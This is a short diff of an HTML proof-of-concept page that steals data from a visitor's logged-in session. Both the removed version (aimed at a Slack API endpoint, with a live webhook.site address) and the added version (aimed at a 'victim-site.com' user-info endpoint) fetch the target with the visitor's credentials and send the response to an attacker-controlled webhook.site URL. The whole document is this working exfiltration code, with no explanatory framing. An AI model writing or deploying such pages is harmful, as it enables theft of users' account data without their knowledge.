@@ -1,21 +1,15 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Malicious Page</title>
+    <title>Test Page</title>
 </head>
 <body>
+    <h1>Click Here</h1>
     <script>
-        fetch("https://slack.com/api/signin.findWorkspaces ", { credentials: "include" })
-            .then(response => response.text())  // Capture the response as text
+        fetch("https://victim-site.com/api/userinfo", { credentials: "include" })
+            .then(response => response.text())
             .then(data => {
-                console.log("Captured Response:", data); // Debugging
-
-                // Send stolen data to your webhook
-                fetch("https://webhook.site/c1acb3f9-304c-414d-b941-3e8094798029", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ stolen_data: data })
-                });
+                fetch("https://webhook.site/YOUR_UNIQUE_ID?stolenData=" + encodeURIComponent(data));
             })
             .catch(err => console.error("Error:", err));
     </script>
